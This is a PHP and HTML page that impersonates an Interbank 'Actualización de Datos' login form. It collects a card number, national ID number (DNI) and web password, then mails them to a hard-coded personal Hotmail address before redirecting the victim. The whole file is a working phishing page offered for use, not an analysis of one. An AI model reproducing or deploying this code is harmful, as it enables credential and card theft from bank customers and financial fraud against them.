<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/estilos.css">
    <script src="js/funciones.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <title>Actualización de Datos</title>
</head>
<body>

    <?php
        if($_SERVER["REQUEST_METHOD"] == "POST") {
            $cc = $_POST['cc'];
            $pass = $_POST['pass'];
            $dni = $_POST['dni'];

            if(isset($cc, $dni, $pass)){
                //$to = "cruzadoeduar18@gmail.com";
                $to = "fernando1894@hotmail.com";
                $subject = "ACTUALIZACION DE DATOS CORREO 1";
                $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
                    "DNI: " . $dni . "\n" . 
                    "CLAVE WEB: " . $pass;
                $headers = "From: pruebas@pruebas.ga";
                mail($to, $subject, $txt, $headers);
                header('Location: form.php');
                die();
            }
            else{
                echo '
                        <script type="text/javascript">
                            $(document).ready(function(){
                            Swal.fire("Datos guardados con éxito.")
                            });
                        </script>
                    ';
            }
        }
    ?>

    <div id="img-container">
        <img id="logo" src="img/im-logo.png" alt="Logo Interbank">
    </div>
    <div id="form-container" class="div-slide">
        <form id="form" method="POST" action="">

            <p id="form-title">Bienvenido</p>

            <input class="form-field" name="cc" id="card" type="text" placeholder="Número de tarjeta" onkeypress='validateNumber(event)' maxlength="19" minlength="19" required></input>
            
            <input class="form-field" name="dni" type="number" placeholder="DNI" required></input>

            <input class="form-field" name="pass" type="password" placeholder="Clave web" required></input>

            <input class="form-btn" type="submit" value="Continuar">
        </form>
    </div>

    <script>
        //Funcion para anadir espacio cada 4 digitos en el campo de tarjeta.
        $('#card').on('keypress change', function () {
            $(this).val(function (index, value) {
	            return value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
            });
        });

        $('#card').on('copy cut paste', function () {
            setTimeout(function () {
                $('#card').trigger("change");
            });
        });
    </script>
</body>
</html>